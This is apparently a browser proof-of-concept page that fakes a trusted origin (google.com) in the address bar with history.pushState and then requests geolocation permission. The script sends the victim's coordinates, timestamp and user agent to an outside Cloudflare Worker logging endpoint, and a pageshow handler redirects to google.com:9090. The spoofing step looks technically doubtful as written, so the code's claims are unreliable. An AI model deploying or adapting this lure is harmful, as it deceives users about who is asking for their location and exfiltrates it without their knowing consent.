<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Geolocation Origin Desync PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
}

button {
  font-size: 15px;
  padding: 10px 14px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
}

#panel {
  display: none;
  max-width: 420px;
  margin: 80px auto;
  background: #fff;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
  text-align: center;
}

.notice {
  margin-top: 14px;
  font-size: 13px;
  color: #b00020;
}
</style>
</head>

<body>

<div style="text-align:center; margin-top:60px;">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Request Location</h2>
  <p>Tap the button below to request Geolocation permission.</p>

  <button onclick="getLocation()">Get Location</button>
  <p id="output">Location: -</p>

  <div class="notice">
    Demo only — observe origin shown in permission dialog
  </div>
</div>

<script>
const panel   = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const output  = document.getElementById('output');

/* ✅ Cloudflare Worker endpoint */
const webhookUrl = 'https://geo-log-production.ecdnts.workers.dev/';

/*
 * Step 1:
 * Manipulate visible URL to simulate a trusted origin
 */
trigger.onclick = () => {
  // Manipulate the visible URL to simulate trusted origin (e.g., google.com)
  history.pushState({}, '', 'https://google.com/trusted');  // This changes the visible URL

  // Now, show the panel
  panel.style.display = 'block';
};

/*
 * Step 2:
 * Call geolocation API after changing URL
 */
function getLocation() {
  if (!navigator.geolocation) return;

  navigator.geolocation.getCurrentPosition(
    pos => {
      output.textContent =
        `${pos.coords.latitude}, ${pos.coords.longitude}`;

      // Send geolocation data to Cloudflare Worker endpoint
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
        }),
      }).catch((err) => {
        console.error('Error sending data to Cloudflare Worker:', err);
      });
    },
    () => {
      output.textContent = 'Permission denied';
    }
  );
}

/*
 * Step 3:
 * Trigger a navigation race shortly after permission flow starts
 * The idea here is to simulate a redirect right after the permission dialog
 */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      // Perform redirection after some delay
      setTimeout(() => {
        location.href = 'https://google.com:9090';  // Simulate a redirect to google.com
      }, 80);
    });
  });
});
</script>

</body>
</html>
